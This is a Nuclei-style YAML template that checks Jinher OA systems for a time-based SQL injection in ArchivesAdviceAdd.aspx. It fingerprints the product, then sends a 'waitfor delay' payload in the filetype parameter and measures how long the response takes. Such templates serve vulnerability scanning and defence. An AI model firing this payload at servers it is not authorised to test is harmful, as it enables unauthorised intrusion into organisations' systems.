id: poc-yaml-jinher-archivesadviceadd-aspx-sqli
info:
  name: 金和OA ArchivesAdviceAdd.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: 金和OA
    fofa: app="金和网络-金和OA"

variables:
  t1: '{{rand_int(5,10)}}'
  t2: '{{to_number(t1) + 2}}'

http:
  - raw:
      - |
        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        words:
          - "JHSoft"
        part: body

  - raw:
      - |
        GET /c6/Jhsoft.Web.Archives/ArchivesAdviceAdd.aspx/?fileid=1&filetype=1'waitfor+delay'0:0:{{t1}}'-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "反馈意见"
          - "请录入您的意见"
          - "其他人的意见"
        part: body
      - type: dsl
        dsl:
          - "duration >= to_number(t1)"
          - "duration <= to_number(t2)"
